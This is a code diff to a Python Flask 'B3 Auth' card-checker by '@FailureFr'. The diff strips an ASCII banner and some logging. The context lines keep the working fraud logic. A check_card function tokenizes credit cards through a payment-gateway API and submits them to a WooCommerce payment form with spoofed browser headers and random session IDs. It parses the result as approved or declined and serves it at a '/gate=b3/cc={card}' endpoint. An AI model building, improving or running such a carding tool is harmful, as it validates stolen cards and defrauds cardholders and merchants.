@@ -6,9 +6,6 @@ import time
 import json
 import random
 import urllib3
-import sys
-import io
-import pyfiglet
 from flask import Flask, jsonify, request
 
 # Disable SSL warnings
@@ -71,34 +68,6 @@ headers = {
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
 }
-
-def display_banner():
-    """Display colorful ASCII art banner using pyfiglet"""
-    # ANSI color codes
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    RESET = '\033[0m'
-    
-    # Generate ASCII art for "B3 Auth"
-    try:
-        ascii_art = pyfiglet.figlet_format("B3 Auth", font="slant")
-        colored_art = f"{CYAN}{BOLD}{ascii_art}{RESET}"
-    except:
-        # Fallback if pyfiglet fails or font not available
-        colored_art = f"{CYAN}{BOLD}B3 Auth{RESET}"
-    
-    # Create the complete banner
-    banner = f"""
-{colored_art}
-{YELLOW}           by - @FailureFr{RESET}
-"""
-    print(banner)
 
 def check_status(result):
     # First, check if the message contains "Reason:" and extract the specific reason
@@ -226,9 +195,6 @@ def check_card(cc_line):
         if not yy.startswith('20'):
             yy = '20' + yy
 
-        # Log tokenization request
-        print(f"[{time.strftime('%H:%M:%S')}] 🔄 Tokenizing card: {n[:4]}****{n[-4:]}")
-        
         # Generate a random device session ID
         device_session_id = ''.join(random.choices('0123456789abcdef', k=32))
         correlation_id = ''.join(random.choices('0123456789abcdef', k=8)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=12))
@@ -282,10 +248,6 @@ def check_card(cc_line):
                 token_data = response.json()
                 if token_data and 'data' in token_data and 'tokenizeCreditCard' in token_data['data'] and 'token' in token_data['data']['tokenizeCreditCard']:
                     token = token_data['data']['tokenizeCreditCard']['token']
-                    print(f"[{time.strftime('%H:%M:%S')}] ✅ Tokenization successful (Time: {elapsed_time:.2f}s)")
-                    
-                    # Log submission request
-                    print(f"[{time.strftime('%H:%M:%S')}] 🔄 Submitting payment method...")
                     
                     headers_submit = headers.copy()
                     headers_submit['content-type'] = 'application/x-www-form-urlencoded'
@@ -315,7 +277,7 @@ def check_card(cc_line):
                     if response.status_code == 200:
                         soup = BeautifulSoup(response.text, 'html.parser')
                         error_div = soup.find('div', class_='woocommerce-notices-wrapper')
-                        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"
+                        message = error_div.get_text(strip=True) if error_div else "Unknown error"
                         
                         status, reason, approved = check_status(message)
 
@@ -379,7 +341,6 @@ def index():
     """
 
 if __name__ == '__main__':
-    display_banner()
     print("Flask server running on http://localhost:5000")
     print("Use endpoint: /gate=b3/cc={card}")
     app.run(debug=True, port=5000)
